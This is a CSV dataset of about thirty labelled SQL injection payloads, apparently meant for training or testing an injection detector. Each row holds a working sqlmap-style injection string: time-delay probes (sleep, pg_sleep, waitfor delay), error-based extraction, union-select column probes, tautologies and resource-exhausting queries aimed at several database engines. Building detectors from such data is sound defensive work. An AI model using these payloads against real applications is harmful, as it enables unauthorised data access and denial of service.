row_index,payload_norm,label,sqli_type_hint
7680,"1"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""isbh"" like ""isbh",1,
7681,( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4501 = 4501 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1,
7682,1 ) where 3979 = 3979 rlike sleep ( 5 ) --,1,
7683,1 ) ) and 4595 = 4595#,1,
7684,1%' ) ) and 1651 = 9324 and ( ( '%' = ',1,
7685,"1' where 1085 = 1085 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
7686,1 ) ) as pynj where 7683 = 7683 waitfor delay '0:0:5'--,1,
7687,"1%' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = '",1,
7688,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'yznn' like 'yznn",1,
7689,1%' and 6454 = 8348 and '%' = ',1,
7690,select sleep ( 5 ) and ( 4863 = 4863,1,
7691,1'|| ( select 'ogyu' from dual where 6691 = 6691,1,
7692,1 ) ) as lkqx where 6468 = 6468 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
7693,"1"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""lsis"" like ""lsis",1,
7694,"( select ( case when ( 1938 = 1938 ) then dbms_pipe.receive_message ( chr ( 118 ) ||chr ( 118 ) ||chr ( 112 ) ||chr ( 76 ) ,5 ) else 1938 end ) from dual )",1,
7695,"1%' ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
7696,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'tjvy' like 'tjvy,1,
7697,"1 ) ) as zmsa where 6909 = 6909 union all select null,null,null,null,null,null,null#",1,
7698,"1' where 4039 = 4039 union all select null,null,null,null,null,null,null,null--",1,
7699,"-5355"" or make_set ( 9354 = 9354,7185 )",1,
7700,"1'|| ( select 'fzcu' where 9252 = 9252 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) ||'",1,
7701,"1' ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
7702,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,1,
7703,"1 ) as drbw where 2380 = 2380 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1,
7704,"-6629%"" ) ) ) or 8571 = 8571--",1,
7705,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",1,
7706,1' ) where 3636 = 3636 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
7707,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'ckpm' = 'ckpm",1,
7708,"-8054' ) ) union all select 5232,5232,5232,5232,5232,5232,5232#",1,
7709,-2983' ) or 8571 = 8571--,1,
